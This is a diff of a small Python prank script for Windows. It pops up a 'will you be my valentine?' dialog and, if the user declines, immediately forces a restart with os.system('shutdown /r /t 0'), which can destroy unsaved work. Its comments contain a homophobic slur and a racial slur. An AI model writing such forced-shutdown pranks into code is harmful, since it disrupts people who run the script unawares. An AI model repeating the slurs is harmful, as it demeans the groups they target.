@@ -1,17 +1,18 @@
 # these tiktok weird fags
 # coded this while on phone ill fix up once i get on pc
+# shit code nigga
 
 import ctypes
 import os
 
+messagebox = ctypes.windll.user32.MessageBoxW
+
 def main():
-    answer = ctypes.windll.user32.MessageBoxW(0, "will you be my valentine?" , "", 4)
+    answer = messagebox(0, "will you be my valentine?" , "", 4)
     if answer == 6:
-        ctypes.windll.user32.MessageBoxW(0, "Thanks Princess" , "", 0)
+        messagebox(0, "Thanks Princess" , "", 0)
     elif answer == 7:
-        answer2 = ctypes.windll.user32.MessageBoxW(0, "fuck you" , "", 0)
-        if answer2 == 0:
-            os.system("shutdown /s /t 1")
+        os.system("shutdown /r /t 0")
 
 if __name__ == '__main__':
     main()
